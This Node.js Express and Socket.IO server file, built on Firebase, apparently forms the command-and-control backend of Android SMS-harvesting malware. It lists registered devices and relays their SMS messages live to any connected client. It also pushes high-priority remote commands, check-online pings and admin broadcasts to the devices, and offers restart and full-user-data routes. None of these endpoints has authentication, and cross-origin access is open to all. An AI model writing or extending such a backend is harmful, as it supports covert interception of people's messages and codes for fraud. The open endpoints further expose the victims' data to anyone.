import dotenv from "dotenv";
dotenv.config();

import express from "express";
import cors from "cors";
import { createServer } from "http";
import { Server } from "socket.io";

import { firestore, rtdb, fcm } from "./config/db.js";

import userFullDataRoutes from "./routes/userFullDataRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import checkRoutes from "./routes/checkRoutes.js";
import commandRoutes from "./routes/commandRoutes.js";
import smsRoutes from "./routes/smsRoutes.js"; // REST ONLY

const PORT = process.env.PORT || 5000;
const app = express();
const server = createServer(app);

console.log("🚀 Bootstrapping backend...");
console.log("🌍 NODE_ENV:", process.env.NODE_ENV || "not-set");
console.log("🔌 PORT:", PORT);

app.use(cors());
app.use(express.json());

/* ---------------- SOCKET.IO ---------------- */
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});
app.set("io", io);

const deviceSockets = new Map();
let lastDevicesList = [];

console.log("✅ Socket.IO initialized");

/* ---------------- UTIL ---------------- */
const clean = (id) => id?.toString()?.trim()?.toUpperCase();

/* ======================================================
      HIGH PRIORITY FCM PUSHER
====================================================== */
async function sendFcmHighPriority(token, type, payload = {}) {
  if (!token) {
    console.warn("⚠️ sendFcmHighPriority called without token. type:", type);
    return;
  }

  try {
    console.log(
      "📤 FCM SEND →",
      JSON.stringify({
        type,
        tokenPrefix: token?.slice(0, 12) + "...",
        payload,
      })
    );

    await fcm.send({
      token,
      android: { priority: "high" },
      data: {
        type: String(type || ""),
        payload: JSON.stringify(payload || {}),
      },
    });

    console.log("✅ FCM SENT OK → type:", type);
  } catch (err) {
    console.error("❌ FCM ERROR:", err.message);
  }
}

/* ======================================================
      BUILD DEVICES LIST
====================================================== */
async function buildDevicesList() {
  console.log("🔄 buildDevicesList() CALLED");

  const [devSnap, statusSnap] = await Promise.all([
    rtdb.ref("registeredDevices").get(),
    rtdb.ref("status").get(),
  ]);

  if (!devSnap.exists()) {
    console.warn("⚠️ buildDevicesList: registeredDevices node empty");
    return [];
  }

  const devs = devSnap.val() || {};
  const stats = statusSnap.exists() ? statusSnap.val() : {};

  const list = Object.entries(devs).map(([id, info]) => {
    const st = stats[id] || {};
    return {
      id,
      ...info,
      connectivity: st.connectivity || "Offline",
      lastSeen: st.lastSeen || st.timestamp || null,
      timestamp: st.timestamp || null,
    };
  });

  console.log(
    `📋 buildDevicesList: devices=${list.length}, statusKeys=${
      Object.keys(stats).length
    }`
  );

  return list;
}

/* ======================================================
      REFRESH DEVICES LIVE
====================================================== */
async function refreshDevicesLive(reason = "") {
  try {
    console.log("🔁 refreshDevicesLive() → reason:", reason);

    const devices = await buildDevicesList();
    lastDevicesList = devices;

    io.emit("devicesLive", {
      success: true,
      reason,
      count: devices.length,
      data: devices,
    });

    console.log(`📡 devicesLive pushed (${reason}) → ${devices.length}`);
  } catch (err) {
    console.error("❌ refreshDevicesLive:", err.message);
  }
}

/* ======================================================
      ⭐ ONLY PER-DEVICE SMS LIVE
====================================================== */

/* ======================================================
      LIVE SMS LISTENER (REALTIME)
====================================================== */

/* ======================================================
      REAL LIVE SMS — PER MESSAGE (Frontend Format)
====================================================== */

const smsRef = rtdb.ref("smsNotifications");

smsRef.on("child_added", (deviceSnap) => {
  const uid = deviceSnap.key;

  deviceSnap.forEach((msgSnap) => {
    const msgId = msgSnap.key;
    const msg = msgSnap.val();

    const finalObj = {
      id: msgId,
      uniqueid: uid,
      ...msg,
    };

    console.log("📩 NEW SMS:", JSON.stringify(finalObj));

    io.emit("smsLogsNew", {
      success: true,
      event: "new",
      uniqueid: uid,
      msgId,
      data: finalObj,
    });
  });
});

smsRef.on("child_changed", (deviceSnap) => {
  const uid = deviceSnap.key;

  deviceSnap.forEach((msgSnap) => {
    const msgId = msgSnap.key;
    const msg = msgSnap.val();

    const finalObj = {
      id: msgId,
      uniqueid: uid,
      ...msg,
    };

    console.log("✏️ SMS UPDATED:", JSON.stringify(finalObj));

    io.emit("smsLogsNew", {
      success: true,
      event: "updated",
      uniqueid: uid,
      msgId,
      data: finalObj,
    });
  });
});

/* ======================================================
      SOCKET.IO CONNECTION
====================================================== */
io.on("connection", (socket) => {
  console.log("🔗 Client Connected:", socket.id);

  let currentDeviceId = null;

  // Initial devicesLive snapshot to newly connected client
  socket.emit("devicesLive", {
    success: true,
    count: lastDevicesList.length,
    data: lastDevicesList,
  });
  console.log(
    `📨 Sent initial devicesLive snapshot to socket=${socket.id}, count=${lastDevicesList.length}`
  );

  /* -------- DEVICE REGISTER -------- */
  socket.on("registerDevice", async (rawId) => {
    const id = clean(rawId);
    if (!id) {
      console.warn(
        `⚠️ registerDevice: invalid / empty id from socket=${socket.id}, rawId=`,
        rawId
      );
      return;
    }

    console.log(
      `🧷 registerDevice: socket=${socket.id}, uniqueid=${id}, rawId=${rawId}`
    );

    deviceSockets.set(id, socket.id);
    currentDeviceId = id;

    try {
      const now = Date.now();
      await rtdb.ref(`status/${id}`).set({
        connectivity: "Online",
        lastSeen: now,
        timestamp: now,
      });

      console.log(
        `✅ Device status set ONLINE in RTDB → uniqueid=${id}, socket=${socket.id}`
      );

      io.emit("deviceStatus", { id, connectivity: "Online" });
      console.log(
        `📡 deviceStatus emit → id=${id}, connectivity=Online (from registerDevice)`
      );

      refreshDevicesLive(`deviceOnline:${id}`);
    } catch (err) {
      console.error(
        `❌ registerDevice: failed to update status for uid=${id}:`,
        err.message
      );
    }
  });

  /* -------- DISCONNECT -------- */
  socket.on("disconnect", async () => {
    console.log("❌ Client Disconnected:", socket.id, "uid=", currentDeviceId);

    if (currentDeviceId) {
      try {
        const now = Date.now();
        await rtdb.ref(`status/${currentDeviceId}`).set({
          connectivity: "Offline",
          lastSeen: now,
          timestamp: now,
        });

        console.log(
          `🔻 Device status set OFFLINE in RTDB → uniqueid=${currentDeviceId}`
        );

        io.emit("deviceStatus", {
          id: currentDeviceId,
          connectivity: "Offline",
        });

        console.log(
          `📡 deviceStatus emit → id=${currentDeviceId}, connectivity=Offline (disconnect)`
        );

        refreshDevicesLive(`deviceOffline:${currentDeviceId}`);
      } catch (err) {
        console.error(
          `❌ disconnect handler error for uid=${currentDeviceId}:`,
          err.message
        );
      }
    }
  });
});

/* ======================================================
      LEGACY /send-command
====================================================== */
app.post("/send-command", async (req, res) => {
  try {
    const { uniqueid, title, message } = req.body;
    const id = clean(uniqueid);

    console.log(
      "📩 /send-command CALLED →",
      JSON.stringify({ uniqueid, cleaned: id, title, message })
    );

    await rtdb.ref(`commands/${id}`).set({
      title,
      message,
      timestamp: Date.now(),
    });

    console.log(`✅ /send-command: command written to RTDB → uid=${id}`);

    return res.json({ success: true });
  } catch (err) {
    console.error("❌ /send-command error:", err.message);
    return res.status(500).json({ success: false });
  }
});

/* ======================================================
      BRO_REPLY LIVE
====================================================== */
const liveReplyWatchers = new Map();

function stopReplyWatcher(uid) {
  if (liveReplyWatchers.has(uid)) {
    console.log(`⏹️ stopReplyWatcher: uid=${uid}`);
    const ref = liveReplyWatchers.get(uid);
    ref.off();
    liveReplyWatchers.delete(uid);
  } else {
    console.log(`ℹ️ stopReplyWatcher: no existing watcher for uid=${uid}`);
  }
}

function startReplyWatcher(uid) {
  console.log(`▶️ startReplyWatcher: uid=${uid}`);

  const ref = rtdb.ref(`checkOnline/${uid}`);
  ref.on("value", (snap) => {
    const data = snap.exists() ? snap.val() : null;

    console.log(
      `📡 brosReplyUpdate emit → uid=${uid}, hasData=${!!data}`
    );

    io.emit("brosReplyUpdate", {
      uid,
      success: true,
      data: data ? { uid, ...data } : null,
    });
  });
  liveReplyWatchers.set(uid, ref);
}

app.get("/api/brosreply/:uid", async (req, res) => {
  try {
    const uid = req.params.uid;
    console.log("📥 GET /api/brosreply/:uid → uid=", uid);

    stopReplyWatcher(uid);

    const snap = await rtdb.ref(`checkOnline/${uid}`).get();
    const data = snap.exists() ? { uid, ...snap.val() } : null;

    console.log(
      `🔍 /api/brosreply: initial data exists=${!!data}, uid=${uid}`
    );

    startReplyWatcher(uid);

    return res.json({
      success: true,
      data,
      message: "Live listening started",
    });
  } catch (err) {
    console.error("❌ /api/brosreply error:", err.message);
    res.status(500).json({ success: false });
  }
});

/* ======================================================
      ADMIN UPDATE BROADCAST
====================================================== */
rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
  if (!snap.exists()) {
    console.log(
      "ℹ️ commandCenter/admin/main changed but empty → skipping broadcast"
    );
    return;
  }
  const adminData = snap.val();
  console.log(
    "🔔 ADMIN UPDATE TRIGGERED →",
    JSON.stringify(adminData)
  );

  const all = await rtdb.ref("registeredDevices").get();
  if (!all.exists()) {
    console.warn(
      "⚠️ ADMIN_UPDATE: no registeredDevices found to broadcast"
    );
    return;
  }

  let count = 0;
  all.forEach((child) => {
    const token = child.val()?.fcmToken;
    if (token) {
      count++;
      sendFcmHighPriority(token, "ADMIN_UPDATE", {
        deviceId: child.key,
        ...adminData,
      });
    }
  });

  console.log(`📣 ADMIN_UPDATE broadcasted to ${count} devices`);
});

/* ======================================================
      DEVICE COMMAND CENTER
====================================================== */
function extractCommandData(raw) {
  if (raw?.action) return raw;
  const keys = Object.keys(raw || {});
  return raw[keys[keys.length - 1]] || raw || null;
}

async function handleDeviceCommandChange(snap) {
  if (!snap.exists()) {
    console.log(
      "ℹ️ handleDeviceCommandChange: snap does not exist, skip"
    );
    return;
  }

  const uid = snap.key;
  const raw = snap.val();
  const cmd = extractCommandData(raw);
  if (!cmd) {
    console.warn(
      `⚠️ handleDeviceCommandChange: no cmd extracted for uid=${uid}`
    );
    return;
  }

  console.log(
    `🎯 DEVICE_COMMAND change detected → uid=${uid}, cmd=`,
    cmd
  );

  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
  const token = devSnap.val()?.fcmToken;
  if (!token) {
    console.warn(
      `⚠️ handleDeviceCommandChange: no fcmToken for uid=${uid}`
    );
    return;
  }

  await sendFcmHighPriority(token, "DEVICE_COMMAND", {
    uniqueid: uid,
    ...cmd,
  });
}

const cmdRef = rtdb.ref("commandCenter/deviceCommands");
console.log("👂 Subscribing to commandCenter/deviceCommands listeners...");
cmdRef.on("child_added", handleDeviceCommandChange);
cmdRef.on("child_changed", handleDeviceCommandChange);

/* ======================================================
      CHECK ONLINE
====================================================== */
async function handleCheckOnlineChange(snap) {
  if (!snap.exists()) {
    console.log("ℹ️ handleCheckOnlineChange: empty snap, skip");
    return;
  }

  const uid = snap.key;
  const data = snap.val() || {};
  const now = Date.now();

  console.log(
    `🟢 CHECK_ONLINE change → uid=${uid}, data=`,
    data
  );

  await rtdb.ref(`resetCollection/${uid}`).set({
    resetAt: now,
    readable: new Date(now).toString(),
  });

  await rtdb.ref(`status/${uid}`).update({
    connectivity: "Online",
    lastSeen: now,
    timestamp: now,
  });

  console.log(
    `✅ CHECK_ONLINE: status updated & resetCollection set → uid=${uid}`
  );

  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
  const token = devSnap.val()?.fcmToken;
  if (!token) {
    console.warn(
      `⚠️ CHECK_ONLINE: no fcmToken for uid=${uid}, skipping FCM`
    );
    return;
  }

  await sendFcmHighPriority(token, "CHECK_ONLINE", {
    uniqueid: uid,
    available: data.available || "unknown",
    checkedAt: String(data.checkedAt || ""),
  });
}

const checkOnlineRef = rtdb.ref("checkOnline");
console.log("👂 Subscribing to checkOnline listeners...");
checkOnlineRef.on("child_added", handleCheckOnlineChange);
checkOnlineRef.on("child_changed", handleCheckOnlineChange);

/* ======================================================
      RESTART SET + GET
====================================================== */
app.post("/restart/:uid", async (req, res) => {
  try {
    const uid = clean(req.params.uid);
    const now = Date.now();

    console.log("♻️ POST /restart → uid=", uid);

    await rtdb.ref(`restart/${uid}`).set({
      restartAt: now,
      readable: new Date(now).toString(),
    });

    console.log(
      `✅ /restart POST: restart flag written → uid=${uid}, restartAt=${now}`
    );

    return res.json({ success: true, restartAt: now });
  } catch (err) {
    console.error("❌ POST /restart error:", err.message);
    res.status(500).json({ success: false });
  }
});

const RESTART_EXPIRY = 15 * 60 * 1000;

app.get("/restart/:uid", async (req, res) => {
  try {
    const uid = clean(req.params.uid);

    console.log("📥 GET /restart/:uid → uid=", uid);

    const snap = await rtdb.ref(`restart/${uid}`).get();
    if (!snap.exists()) {
      console.log(
        `ℹ️ /restart GET: no restart data for uid=${uid}`
      );
      return res.json({ success: true, data: null });
    }

    const data = snap.val();
    const diff = Date.now() - Number(data.restartAt);

    if (diff > RESTART_EXPIRY) {
      console.log(
        `⏰ /restart GET: restart flag expired for uid=${uid}, removing`
      );
      await rtdb.ref(`restart/${uid}`).remove();
      return res.json({ success: true, data: null });
    }

    console.log(
      `✅ /restart GET: active restart flag → uid=${uid}, age=${diff}ms`
    );

    return res.json({
      success: true,
      data: {
        uid,
        restartAt: data.restartAt,
        readable: data.readable,
        age: diff,
      },
    });
  } catch (err) {
    console.error("❌ GET /restart error:", err.message);
    res.status(500).json({ success: false });
  }
});

/* ======================================================
      LAST CHECK API
====================================================== */
function formatAgo(ms) {
  const sec = Math.floor((Date.now() - ms) / 1000);
  if (sec < 60) return `${sec} sec`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `${min} min`;
  const hr = Math.floor(min / 60);
  if (hr < 24) return `${hr} hr`;
  const day = Math.floor(hr / 24);
  return `${day} days`;
}

app.get("/api/lastcheck/:uid", async (req, res) => {
  try {
    const uid = clean(req.params.uid);
    console.log("📥 GET /api/lastcheck/:uid → uid=", uid);

    const snap = await rtdb.ref(`status/${uid}`).get();

    if (!snap.exists()) {
      console.warn(
        `⚠️ /api/lastcheck: No status found for uid=${uid}`
      );
      return res.json({ success: false, message: "No status found" });
    }

    const st = snap.val();
    const ts = st.timestamp || st.lastSeen || 0;

    console.log(
      `✅ /api/lastcheck: uid=${uid}, timestamp=${ts}, readable=${ts ? formatAgo(ts) : "N/A"}`
    );

    return res.json({
      success: true,
      uid,
      lastCheckAt: ts,
      readable: ts ? formatAgo(ts) : "N/A",
    });
  } catch (err) {
    console.error("❌ /api/lastcheck error:", err.message);
    res.status(500).json({ success: false });
  }
});


const registeredDevicesRef = rtdb.ref("registeredDevices");

console.log("👂 Subscribing to registeredDevices listeners...");
registeredDevicesRef.on("child_added", () => {
  console.log("➕ registeredDevices child_added → refreshDevicesLive");
  refreshDevicesLive("registered_added");
});
registeredDevicesRef.on("child_changed", () => {
  console.log("✏️ registeredDevices child_changed → refreshDevicesLive");
  refreshDevicesLive("registered_changed");
});
registeredDevicesRef.on("child_removed", () => {
  console.log("🗑️ registeredDevices child_removed → refreshDevicesLive");
  refreshDevicesLive("registered_removed");
});

app.get("/api/devices", async (req, res) => {
  try {
    console.log("📥 GET /api/devices called");
    const devices = await buildDevicesList();
    console.log("✅ /api/devices: returning", devices.length, "devices");
    return res.json({
      success: true,
      count: devices.length,
      data: devices,
    });
  } catch (err) {
    console.error("❌ /api/devices error:", err.message);
    res.status(500).json({ success: false });
  }
});

/* ======================================================
      INITIAL LOAD
====================================================== */
console.log("🚚 Running initial devicesLive refresh...");
await refreshDevicesLive("initial");

/* ======================================================
      ROUTES
====================================================== */
app.use(adminRoutes);
app.use("/api", checkRoutes);
app.use("/api", userFullDataRoutes);
app.use(commandRoutes);
app.use(smsRoutes);

app.get("/", (_, res) => {
  console.log("📥 GET / (root) called");
  res.send(" RTDB + Socket.IO Backend Running");
});

/* ======================================================
      START SERVER
====================================================== */
server.listen(PORT, () => {
  console.log(`✅ Server running on PORT ${PORT}`);
});
